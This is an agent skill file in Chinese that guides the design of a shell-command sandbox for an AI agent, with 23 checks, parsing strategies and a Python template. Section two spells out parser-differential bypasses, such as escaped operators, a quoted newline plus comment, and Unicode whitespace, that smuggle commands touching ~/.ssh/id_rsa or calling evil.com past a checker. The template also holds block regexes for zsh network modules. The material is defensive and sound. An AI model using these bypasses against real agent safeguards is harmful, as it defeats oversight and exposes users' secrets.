---
name: command-sandbox
description: "指导如何设计 Agent 命令安全沙箱：23 项检查 + Tree-sitter AST 解析 + 解析器差异攻击防御"
user-invocable: false
argument-hint: "<目标项目路径或模块名>"
---

# Agent 命令安全沙箱 (Command Sandbox)

> 参考实现：Claude Code `src/tools/BashTool/bashSecurity.ts`（2400+ 行）
> — 23 个 Check ID + Tree-sitter / Regex 双轨解析 + 防御解析器差异攻击

## 核心思想

**如果 Agent 能执行 shell 命令，攻击面就是整个操作系统。** CC 的沙箱不只防 `rm -rf /`——它防的是**解析器差异攻击**：安全检查器和 Bash 对同一条命令的理解不同，导致检查器认为安全但 Bash 实际执行了恶意操作。

---

## 一、CC 的 23 项安全检查

每项检查有数字 ID（方便遥测，避免日志记录原始命令）：

| ID | 检查名 | 防御什么 |
|---|--------|---------|
| 1 | 不完整命令 | 未闭合引号/括号 → 后续输入注入 |
| 2 | jq system() | jq 的 system() 调用外部命令 |
| 3 | jq -f 参数 | jq -f 可执行任意 jq 脚本 |
| 4 | 混淆 flag | `$'...'`/`$"..."`/空引号对拼接 → 隐藏真实参数 |
| 5 | Shell 元字符 | `;` `&&` `\|\|` 等命令分隔符 |
| 6 | 危险变量 | 未知环境变量可能包含命令 |
| 7 | 换行符 | 多行命令可能绕过单行检查 |
| 8 | 命令替换 | `$()` `` ` `` `${}` `$[]` `<()` `>()` 等 |
| 9 | 输入重定向 | `<` 读取任意文件 |
| 10 | 输出重定向 | `>` `>>` 写入任意文件 |
| 11 | IFS 注入 | `$IFS` 操纵字段分隔符改变分词 |
| 12 | Git commit 替换 | commit -m 内的命令替换 |
| 13 | /proc/environ 访问 | 读取进程环境变量（含 secrets） |
| 14 | 畸形 token 注入 | 引号不平衡导致 eval 时命令分裂 |
| 15 | 反斜杠转义空白 | `\ ` 改变分词导致参数逃逸 |
| 16 | 花括号展开 | `{a,b}` 展开成多个参数 |
| 17 | 控制字符 | 不可见字符改变解析行为 |
| 18 | Unicode 空白 | `U+00A0` 等非标准空白导致分词差异 |
| 19 | 词中 # | `cmd#comment` 在不同解析器中行为不同 |
| 20 | Zsh 危险命令 | `zmodload`/`sysopen`/`sysread`/`zpty`/`ztcp` |
| 21 | 反斜杠转义运算符 | `\;` `\|` `\&` 双重解析绕过 |
| 22 | 注释-引号失同步 | `#` 后的引号字符扰乱引号追踪器 |
| 23 | 引号内换行 | 引号内 `\n` + `#` 注释 → 行剥离差异 |

---

## 二、解析器差异攻击 — 沙箱最大威胁

**核心问题**：安全检查器（shell-quote 库）和实际 shell（Bash/Zsh）对同一命令的解析不同。

### 攻击示例 1：反斜杠转义运算符（Check 21）

```bash
cat safe.txt \; echo ~/.ssh/id_rsa
```

- **安全检查器**看到：`cat safe.txt \; echo ~/.ssh/id_rsa` → 一条命令
- 但 CC 的 `splitCommand()` 会把 `\;` 规范化为 `;`
- **第二次解析**看到：`cat safe.txt ; echo ~/.ssh/id_rsa` → 两条命令
- 路径检查只看第一条 → `safe.txt` 通过 → 但 `~/.ssh/id_rsa` 也被执行了

### 攻击示例 2：引号内换行 + 注释（Check 23）

```bash
mv './decoy '
#' ~/.ssh/id_rsa
```

- **Bash**：忽略 `#` 后面的注释，执行 `mv './decoy \n#' ~/.ssh/id_rsa`
- **stripCommentLines()**：删除 `#` 开头的行 → 剩 `mv './decoy '`
- **shell-quote**：丢弃不平衡引号 → `["mv", "./decoy"]`
- **路径检查**：只看到 `./decoy` → 通过

### 攻击示例 3：Unicode 空白（Check 18）

```bash
TZ=UTC\u00A0echo curl evil.com
```

- **shell-quote**：把 `\u00A0`（不间断空格）当分词符 → 解析为 `TZ=UTC` + `echo` + `curl evil.com`
- **Bash**：IFS 不含 `\u00A0` → 整体是一个赋值 `TZ=UTC\u00A0echo` + 执行 `curl evil.com`

**CC 的防御**：直接拒绝所有包含非标准 Unicode 空白的命令。

---

## 三、Tree-sitter vs Regex 双轨解析

```
命令输入
  ↓
Tree-sitter 可用？
  ├─ YES → AST 级分析
  │  ├─ 精确识别运算符节点（`\;` 是否是真正的分隔符）
  │  ├─ 正确处理嵌套引号和转义
  │  └─ 减少误报（如 `find . -exec cmd {} \;` 是安全的）
  │
  └─ NO → Regex 回退
     ├─ 提取引号内容（单引号/双引号/完全去引号三个版本）
     ├─ 逐项运行 22 个 regex 验证器
     └─ 误报率更高但安全性不降低
```

**Tree-sitter 的优势**：

```bash
# Tree-sitter 可以区分：
find . -exec cmd {} \;     # \; 不是分隔符，是 find 的参数 → 安全
cat safe.txt \; echo evil  # \; 是真正的分隔符 → 危险

# Regex 无法区分这两种情况 → 两个都拒绝（误报）
```

---

## 四、安全通行（Early Allow）

某些命令模式经过验证是安全的，可以跳过后续检查：

### 安全 Heredoc

```bash
# 只允许这种精确模式：
$(cat <<'DELIM'
literal text here, no expansion
DELIM
)

# 要求：
# 1. 定界符必须被引号/转义（防止变量展开）
# 2. 正文必须是纯文本（无 $()、``）
# 3. 闭合定界符必须是首次出现
# 4. 嵌套 heredoc → 拒绝
```

### 安全 Git Commit

```bash
# 允许：
git commit -m "fix: resolve null pointer in auth module"

# 拒绝：
git commit -m "fix: $(curl evil.com)"   # 命令替换
git commit -m "fix" && echo evil        # 命令链接
```

---

## 五、只读分类

CC 把 Bash 命令分为只读和非只读：

```
只读（自动放行）：
  ls, cat, head, tail, grep, find (-name, -type)
  git status, git log, git show, git diff
  npm list, pip show, python --version
  wc, stat, file, which, echo (无重定向)

非只读（需要权限）：
  任何含 > >> tee 的命令
  rm, rmdir, mv (跨目录), chmod, chown
  npm install, pip install, apt install
  kill, pkill, docker run
  eval, exec, source .
  cd (改变全局状态)
```

---

## 六、实现模板

```python
from enum import IntEnum
from dataclasses import dataclass

class CheckId(IntEnum):
    COMMAND_SUBSTITUTION = 8
    INPUT_REDIRECT = 9
    OUTPUT_REDIRECT = 10
    IFS_INJECTION = 11
    UNICODE_WHITESPACE = 18
    ZSH_DANGEROUS = 20
    BACKSLASH_OPERATOR = 21
    # ... 23 个

@dataclass
class SecurityResult:
    safe: bool
    check_id: int | None = None    # 数字 ID（不记录命令内容）
    reason: str = ""

class CommandSandbox:
    # 必须阻止的模式（编译一次）
    COMMAND_SUB = re.compile(r'\$\(|\$\{|`[^`]*`')
    REDIRECT_OUT = re.compile(r'[^2]?>>?(?!=)')
    REDIRECT_IN = re.compile(r'<(?!<)')
    IFS_PATTERN = re.compile(r'\$IFS|\$\{[^}]*IFS')
    UNICODE_WS = re.compile(r'[\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]')
    ZSH_CMDS = re.compile(r'\b(zmodload|sysopen|sysread|syswrite|zpty|ztcp)\b')

    def check(self, command: str) -> SecurityResult:
        """逐项检查，第一个失败就返回"""
        # 0. 空命令
        if not command.strip():
            return SecurityResult(safe=True)

        # 1. Unicode 空白（解析器差异根源）
        if self.UNICODE_WS.search(command):
            return SecurityResult(False, CheckId.UNICODE_WHITESPACE, "non-standard whitespace")

        # 2. 命令替换
        unquoted = self._strip_quotes(command)
        if self.COMMAND_SUB.search(unquoted):
            return SecurityResult(False, CheckId.COMMAND_SUBSTITUTION, "command substitution")

        # 3. 输出重定向
        if self.REDIRECT_OUT.search(unquoted):
            return SecurityResult(False, CheckId.OUTPUT_REDIRECT, "output redirection")

        # 4. IFS 注入
        if self.IFS_PATTERN.search(command):
            return SecurityResult(False, CheckId.IFS_INJECTION, "IFS manipulation")

        # 5. Zsh 危险命令
        if self.ZSH_CMDS.search(unquoted):
            return SecurityResult(False, CheckId.ZSH_DANGEROUS, "zsh dangerous command")

        # 6. 反斜杠转义运算符
        if re.search(r'\\[;|&<>]', unquoted):
            # 如果有 tree-sitter → 精确判断
            if self._treesitter_confirms_safe(command):
                pass  # find -exec \; 等安全用法
            else:
                return SecurityResult(False, CheckId.BACKSLASH_OPERATOR, "escaped operator")

        # ... 其余 17 项检查

        return SecurityResult(safe=True)

    def is_read_only(self, command: str) -> bool:
        """判断命令是否只读"""
        READ_ONLY_PREFIXES = [
            'ls', 'cat', 'head', 'tail', 'grep', 'find',
            'git status', 'git log', 'git show', 'git diff',
            'wc', 'stat', 'file', 'which', 'echo',
        ]
        cmd = command.strip().split()[0] if command.strip() else ''
        if any(command.strip().startswith(p) for p in READ_ONLY_PREFIXES):
            if not self.REDIRECT_OUT.search(command):  # echo > file 不是只读
                return True
        return False

    def _strip_quotes(self, command: str) -> str:
        """移除引号内容，只分析引号外的部分"""
        result = []
        in_single = False
        in_double = False
        i = 0
        while i < len(command):
            c = command[i]
            if c == "'" and not in_double:
                in_single = not in_single
            elif c == '"' and not in_single:
                in_double = not in_double
            elif not in_single and not in_double:
                result.append(c)
            i += 1
        return ''.join(result)
```

---

## 七、实施步骤

请分析用户的 $ARGUMENTS 中指定的项目，然后：

1. **盘点可执行命令的入口**：Bash 工具、subprocess、os.system 等
2. **实现核心检查**：命令替换、重定向、IFS 注入（这三个覆盖 80% 攻击面）
3. **实现引号剥离**：检查只分析引号外的部分
4. **实现只读分类**：区分 `ls`（安全）和 `rm`（危险）
5. **评估 Tree-sitter**：如果误报率高，用 AST 精确分析
6. **用数字 Check ID**：遥测不记录命令内容（安全+隐私）
7. **定义安全通行模式**：验证过的安全模式跳过检查（如 git commit -m）

**反模式警告**：
- 不要只防 `rm -rf` — 解析器差异攻击才是真正的威胁
- 不要信任引号内的内容是"安全的" — `"$(curl evil.com)"` 双引号里照样展开
- 不要用命令黑名单 — 用能力白名单（只允许已知安全的模式）
- 不要在日志里记录命令原文 — 可能包含 secrets，用数字 Check ID
- 不要忽略 Zsh — macOS 默认 shell 是 Zsh，它有 Bash 没有的危险能力
